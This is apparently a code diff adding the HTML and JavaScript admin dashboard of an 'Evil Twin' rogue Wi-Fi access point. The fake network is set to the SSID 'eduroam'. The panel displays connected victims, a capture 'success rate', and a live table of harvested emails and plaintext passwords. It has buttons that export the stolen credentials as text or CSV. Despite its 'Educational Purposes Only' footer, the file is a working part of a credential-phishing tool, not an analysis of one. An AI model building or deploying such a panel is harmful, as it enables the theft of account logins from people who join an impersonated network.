@@ -1,0 +1,194 @@
+<!DOCTYPE html>
+<html>
+<head>
+<title>Evil Twin - Admin Dashboard</title>
+<meta name='viewport' content='width=device-width, initial-scale=1'>
+<style>
+* { margin: 0; padding: 0; box-sizing: border-box; }
+body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; background: #0f172a; color: #e2e8f0; padding: 15px; line-height: 1.5; }
+.header { background: #1e293b; padding: 15px; border-radius: 12px; margin-bottom: 15px; border-left: 4px solid #4ade80; display: flex; flex-direction: column; gap: 12px; }
+.header-top { display: flex; justify-content: space-between; align-items: flex-start; flex-wrap: wrap; gap: 10px; }
+.header-actions { display: flex; flex-wrap: wrap; gap: 8px; align-items: center; width: 100%; }
+h1 { color: #4ade80; font-size: 20px; letter-spacing: -0.5px; margin: 0; line-height: 1.2; word-break: break-word; }
+.status { display: inline-flex; align-items: center; padding: 4px 10px; background: rgba(34, 197, 94, 0.2); color: #4ade80; border: 1px solid #22c55e; border-radius: 20px; font-size: 11px; font-weight: bold; }
+.stats { display: grid; grid-template-columns: repeat(auto-fit, minmax(140px, 1fr)); gap: 12px; margin-bottom: 15px; }
+.stat { background: #1e293b; padding: 15px; border-radius: 12px; border-top: 3px solid #3b82f6; box-shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.1); }
+.stat-label { color: #94a3b8; font-size: 11px; margin-bottom: 5px; text-transform: uppercase; letter-spacing: 0.5px; font-weight: 600; }
+.stat-value { color: #f8fafc; font-size: 24px; font-weight: 700; font-family: 'Courier New', monospace; }
+.section { background: #1e293b; padding: 15px; border-radius: 12px; margin-bottom: 15px; border: 1px solid #334155; box-shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.1); }
+.section-title { color: #f8fafc; font-size: 16px; margin-bottom: 12px; display: flex; justify-content: space-between; align-items: center; font-weight: 600; }
+.log-container { background: #0b1120; padding: 12px; border-radius: 8px; max-height: 250px; overflow-y: auto; margin-bottom: 12px; font-family: 'Courier New', monospace; border: 1px solid #1e293b; }
+.log-entry { color: #cbd5e1; font-size: 12px; margin-bottom: 8px; line-height: 1.5; word-wrap: break-word; word-break: break-all; border-bottom: 1px solid rgba(255,255,255,0.05); padding-bottom: 8px; }
+.log-entry:last-child { border-bottom: none; margin-bottom: 0; padding-bottom: 0; }
+.memory-bar { background: #334155; height: 16px; border-radius: 8px; overflow: hidden; margin: 10px 0 15px 0; }
+.memory-fill { background: linear-gradient(90deg, #4ade80, #3b82f6); height: 100%; transition: width 0.4s ease-in-out; }
+.button { display: inline-flex; align-items: center; justify-content: center; padding: 12px 16px; background: #3b82f6; color: white; text-decoration: none; border-radius: 8px; border: none; cursor: pointer; font-size: 14px; font-weight: 600; transition: all 0.2s; -webkit-tap-highlight-color: transparent; }
+.button:active { transform: scale(0.98); background: #2563eb; }
+.button-danger { background: rgba(239, 68, 68, 0.1); color: #ef4444; border: 1px solid #ef4444; }
+.button-danger:active { background: #ef4444; color: white; }
+.button-sm { padding: 8px 12px; font-size: 12px; border-radius: 6px; }
+.button-outline { background: transparent; color: #4ade80; border: 1px solid #4ade80; }
+.ssid-form { display: flex; flex-direction: column; gap: 10px; margin-top: 12px; }
+@media(min-width: 480px) { .ssid-form { flex-direction: row; } }
+.ssid-form input { flex: 1; padding: 12px 16px; background: #0b1120; border: 1px solid #334155; border-radius: 8px; color: #e2e8f0; font-size: 15px; outline: none; transition: border-color 0.2s; }
+.ssid-form input:focus { border-color: #3b82f6; }
+.refresh-indicator { color: #94a3b8; font-size: 12px; display: flex; align-items: center; gap: 6px; }
+.refresh-indicator::before { content: ''; display: inline-block; width: 8px; height: 8px; border-radius: 50%; background: #4ade80; }
+.blink::before { animation: blink 1.5s infinite; }
+@keyframes blink { 0%, 100% { opacity: 1; } 50% { opacity: 0.3; } }
+#credtable { overflow-x: auto; -webkit-overflow-scrolling: touch; border-radius: 8px; border: 1px solid #334155; background: #0b1120; }
+.cred-table { width: 100%; border-collapse: collapse; min-width: 400px; font-family: 'Courier New', monospace; }
+.cred-table th, .cred-table td { padding: 12px 15px; text-align: left; border-bottom: 1px solid #1e293b; }
+.cred-table th { color: #f8fafc; font-weight: 600; font-size: 12px; font-family: -apple-system, sans-serif; text-transform: uppercase; background: rgba(255,255,255,0.02); }
+.cred-table td { color: #cbd5e1; font-size: 13px; }
+.cred-table tr:last-child td { border-bottom: none; }
+.actions-row { display: flex; gap: 10px; flex-wrap: wrap; margin-top:15px; }
+.actions-row .button { flex: 1; min-width: 120px; }
+</style>
+<script>
+var refreshInterval = null;
+var currentCreds = [];
+function updateData() {
+  fetch('/admin-data').then(r => r.json()).then(data => {
+    document.getElementById('current_ssid').innerHTML = data.ssid;
+    if (!window.ssidInitialized) {
+      document.getElementById('ssid_input').value = data.ssid;
+      window.ssidInitialized = true;
+    }
+    document.getElementById('uptime').innerHTML = data.uptime;
+    document.getElementById('devices').innerHTML = data.devices;
+    document.getElementById('connections').innerHTML = data.connections;
+    document.getElementById('captured').innerHTML = data.captured;
+    document.getElementById('rate').innerHTML = data.rate + '%';
+    document.getElementById('logcount').innerHTML = data.logcount + '/' + data.maxlogs;
+    document.getElementById('membar').style.width = data.memusage + '%';
+    var logsHtml = '';
+    for(var i=0; i<data.logs.length; i++) { logsHtml += '<div class=\"log-entry\">' + data.logs[i] + '</div>'; }
+    document.getElementById('logs').innerHTML = logsHtml;
+      var credHtml = data.credcount == 0 ? '<div style=\'padding: 20px; text-align: center; color:#94a3b8; background: #1e293b; border-radius: 6px;\'>No credentials captured yet...</div>' : '';
+    if(data.credcount > 0) {
+      currentCreds = data.creds;
+      credHtml = '<table class=\"cred-table\"><thead><tr><th>Time</th><th>Email</th><th>Password</th><th>Device</th></tr></thead><tbody>';
+      for(var i=0; i<data.creds.length; i++) {
+        credHtml += '<tr><td>'+data.creds[i].t+'</td><td>'+data.creds[i].e+'</td><td><span style=\"color:#ef4444;font-weight:bold;\">'+data.creds[i].p+'</span></td><td>'+data.creds[i].d+'</td></tr>';
+      }
+      credHtml += '</tbody></table>';
+    }
+    document.getElementById('credtable').innerHTML = credHtml;
+    document.getElementById('autorefresh').classList.add('blink');
+    setTimeout(function(){ document.getElementById('autorefresh').classList.remove('blink'); }, 200);
+  });
+}
+function toggleAuto() {
+  if(refreshInterval) { clearInterval(refreshInterval); refreshInterval=null; document.getElementById('togglebtn').innerHTML='Start Auto'; }
+  else { refreshInterval=setInterval(updateData,3000); document.getElementById('togglebtn').innerHTML='Stop Auto'; updateData(); }
+}
+window.onload = function(){ toggleAuto(); };
+
+function copyToClipboard(asCsv) {
+  if (currentCreds.length === 0) {
+    alert("No credentials to copy!");
+    return;
+  }
+  let output = "";
+  if (asCsv) {
+    output = "Timestamp,Email,Password,Device\n";
+    currentCreds.forEach(c => {
+      output += `"${c.t}","${c.e}","${c.p}","${c.d}"\n`;
+    });
+  } else {
+    currentCreds.forEach(c => {
+      output += `Time: ${c.t} | Email: ${c.e} | Password: ${c.p} | Device: ${c.d}\n`;
+    });
+  }
+  
+  let btn = event.target || window.event.srcElement;
+  let oldText = btn.innerHTML;
+
+  // Fallback for HTTP / Captive Portals
+  let textArea = document.createElement("textarea");
+  textArea.value = output;
+  textArea.style.position = "fixed";
+  textArea.style.opacity = "0";
+  document.body.appendChild(textArea);
+  textArea.focus();
+  textArea.select();
+  
+  try {
+    let successful = document.execCommand('copy');
+    if(successful) {
+      btn.innerHTML = "Copied!";
+      btn.style.background = "#4ade80";
+      setTimeout(() => { btn.innerHTML = oldText; btn.style.background = ""; }, 2000);
+    } else {
+      alert("Browser prevented copying.");
+    }
+  } catch (err) {
+    alert("Copy blocked by iOS/Browser: " + err);
+  }
+  document.body.removeChild(textArea);
+}
+</script>
+</head>
+<body>
+
+<div class='header'>
+<div class='header-top'>
+<div>
+<h1>EVIL TWIN</h1>
+<div style="margin-top:4px;"><span class='status'>OPERATIONAL</span></div>
+</div>
+<span id='autorefresh' class='refresh-indicator'>Auto-refresh</span>
+</div>
+<div class='header-actions'>
+<button onclick='toggleAuto()' id='togglebtn' class='button button-sm button-outline'>Stop Auto</button>
+<button onclick='updateData()' class='button button-sm button-outline'>Refresh Now</button>
+</div>
+</div>
+
+<div class='stats'>
+<div class='stat'><div class='stat-label'>UPTIME</div><div class='stat-value' id='uptime'>0:00:00</div></div>
+<div class='stat'><div class='stat-label'>CONNECTED DEVICES</div><div class='stat-value' id='devices'>0</div></div>
+<div class='stat'><div class='stat-label'>TOTAL CONNECTIONS</div><div class='stat-value' id='connections'>0</div></div>
+<div class='stat'><div class='stat-label'>CREDENTIALS CAPTURED</div><div class='stat-value' id='captured'>0</div></div>
+<div class='stat'><div class='stat-label'>SUCCESS RATE</div><div class='stat-value' id='rate'>0%</div></div>
+</div>
+
+<div class='section'>
+<div class='section-title'>MEMORY USAGE <span style='color:#94a3b8; font-size:14px;' id='logcount'>0/30 logs</span></div>
+<div class='memory-bar'><div class='memory-fill' id='membar' style='width:0%;'></div></div>
+<button class='button button-danger' onclick="if(confirm('Clear all logs?')){window.location.href='/admin-clear';}">Clear Logs</button>
+</div>
+
+<div class='section'>
+<div class='section-title'>NETWORK CONFIG</div>
+<p style='color:#94a3b8; margin-bottom:10px;'>Current SSID: <strong id='current_ssid' style='color:#4ade80;'>eduroam</strong></p>
+<form method='POST' action='/admin-ssid' class='ssid-form'>
+<input type='text' id='ssid_input' name='ssid' placeholder='Enter new SSID' maxlength='32' value='eduroam'>
+<button type='submit' class='button'>Save SSID</button>
+</form>
+</div>
+
+<div class='section'>
+<div class='section-title'>LIVE LOGS</div>
+<div class='log-container' id='logs'>
+</div>
+</div>
+
+<div class='section'>
+<div class='section-title'>CAPTURED CREDENTIALS</div>
+<div id='credtable'>
+<p style='color:#94a3b8;'>No credentials captured yet...</p>
+</div>
+<div class='actions-row'>
+<button onclick='copyToClipboard(false)' class='button'>Copy as Text</button>
+<button onclick='copyToClipboard(true)' class='button'>Copy as CSV</button>
+</div>
+</div>
+
+<div style='text-align:center; color:#64748b; font-size:12px; margin-top:30px;'>
+Evil Twin | Educational Purposes Only | <a href='/admin-logout' style='color:#4ade80;'>Logout</a>
+</div>
+
+</body>
+</html>
